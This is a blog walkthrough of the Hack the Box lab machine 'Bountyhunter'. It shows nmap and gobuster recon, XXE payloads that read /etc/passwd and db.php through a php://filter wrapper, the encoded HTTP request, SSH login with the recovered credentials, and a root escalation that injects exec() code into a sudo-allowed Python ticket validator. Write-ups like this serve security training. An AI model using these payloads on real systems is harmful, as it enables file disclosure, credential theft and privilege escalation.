+++
author = "Nick"
categories = ["hack the box", "Linux", "easy", "XXE", "burpsuite", "php filters", "python", "GTFObins"]
date = 2021-11-20T15:01:08Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/08/bounty.png"
slug = "hack-the-box-bountyhunter"
tags = ["hack the box", "Linux", "easy", "XXE", "burpsuite", "php filters", "python", "GTFObins"]
title = "Hack the Box - Bountyhunter"

+++


Welcome! Today we are going to be doing the Hack the Box machine - Bountyhunter. This is listed as an easy Linux machine. Let's see what's in store!

As always, we start with a full `nmap` scan. Here are the resutlts:

```
Nmap scan report for 10.10.11.100
Host is up (0.049s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are only two ports open. Let's see what's being hosted on port 80. When we land on the page, we see a standard landing page. Digging around, we find a `log_submit.php` page. When we fill out the data required, we get the following response.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-28.png" >}}

Since this entry point will be a web entry point. We'll do everything going forward inside `Burpsuite`. We check the request and we see that it's coming accross as base64 encoded XML data.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-27.png" >}}

{{< figure src="__GHOST_URL__/content/images/2021/08/image-29.png" >}}

Before we dig much futher into the web requests, we're going to start some basic enumeration and see what we can find. We know there is a endpoint called `tracker_diRbPr00f314.php`, this would lead us to believe we won't be able to enumerate it.

Command:
`gobuster dir -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x .php,.old,.bak -t 60 -b 403,404`

This runs but doesn't find much of anything, shocker. Now, back to the original request. We know that `XXE` is a common attack vector, it's possible it's our foothold here.

The above is a malformed `base64` encoding. The `%3D` is URL encoding for `=`. Thus our full data set would be:

`PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4xPC90aXRsZT4KCQk8Y3dlPjI8L2N3ZT4KCQk8Y3Zzcz4zPC9jdnNzPgoJCTxyZXdhcmQ+NDQ8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=`

Giving us the following data being sent:

{{< figure src="__GHOST_URL__/content/images/2021/08/image-30.png" >}}

Now we need to craft a PoC. You can read more on [XXE here](https://portswigger.net/web-security/xxe). We'll use the basic example they had listed for our PoC. Here is our payload:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
	  <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>1</title>
		<cwe>2</cwe>
		<cvss>3</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```

Once we have our payload created, we need to convert it to base64. Then we need to convert that base64 to URL encoding, since it will have some `+` signs in it. Overall our request looks like this:

```
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
Content-Length: 305
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.11.100
Referer: http://10.10.11.100/log_submit.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCSAgPCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI%2bIF0%2bCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bMTwvdGl0bGU%2bCgkJPGN3ZT4yPC9jd2U%2bCgkJPGN2c3M%2bMzwvY3Zzcz4KCQk8cmV3YXJkPiZ4eGU7PC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b
```

You can see we are only trying to view the `/etc/passwd` file as our PoC. We put it into `Burp` and see what we get.

{{< figure src="__GHOST_URL__/content/images/2021/08/XXE.gif" >}}

It works! Perfect! Now we need to leverage this to obtain a foothold. Based on the above data, we know the user we are after - `development`. After attempting to read `id_rsa` and `db.php` files with the traditional method of `file:///`, we need to leverage something different. We need to use a `php filter` to obtain access to the files we want.

Syntax:
`"php://filter/convert.base64-encode/resource=/var/www/html/db.php"`

This will be the payload portion of our `XXE`. Here's our new `XXE` payload.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
	  <!DOCTYPE foo [ 
              <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> 
                 ]>
		<bugreport>
		<title>1</title>
		<cwe>2</cwe>
		<cvss>3</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```

After we convert this to base64 and URL encode it, we get a valid response:

{{< figure src="__GHOST_URL__/content/images/2021/08/image-32.png" >}}

A base64 encoded string. When we decode it, we get the following:

{{< figure src="__GHOST_URL__/content/images/2021/08/image-33.png" >}}

A set of credentials! Finally! Now, we see a `testuser` account but I'm willing to bet, that these credentials will also work for the user `development` as well. Let's try to leverage them to `SSH`.

Sure enough, they do!

{{< figure src="__GHOST_URL__/content/images/2021/08/image-34.png" >}}

We are able to log in and get the `user.txt` flag! Once we're in, we check `sudo -l` to see if there are any easy hints for priv esc.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-36.png" >}}

Sure enough, we have access to `ticketValidator.py`. When we view the file, we see that there are some basic requirements to the file we want to read.

* It must be a `.md` file
* It must start with # Skytrain Inc
* The second line must start with ## Ticket to
* The third line must be __Ticket Code __ 
* The fourth line can be the code we want to execute. It has to start with `**`. 
* The code checks for `% 7 == 4`. That number is 102 or 4.
* Then it will split the file along a `+` then run the code AFTER that split.  

So we'll create a file called `rootme.md` and add our first three lines.

```
# Skytrain Inc
## Ticket to rootsville
__Ticket Code:__
```

Now we can give it our malicious code. We can drop right to a r[oot shell via python](https://gtfobins.github.io/gtfobins/python/). Remember, we still need to use the exec() function in order to get execution.

Here's our final code:

```
# Skytrain Inc
## Ticket to rootsville
__Ticket Code:__
**102+6969 and exec("import os;os.system('cat /root/root.txt')")
```

Then we run our script.

Command:
`sudo python3.8 /opt/skytrain_inc/ticketValidator.py`

{{< figure src="__GHOST_URL__/content/images/2021/08/bountyroot.gif" >}}

There we have it, the `root.txt` flag!



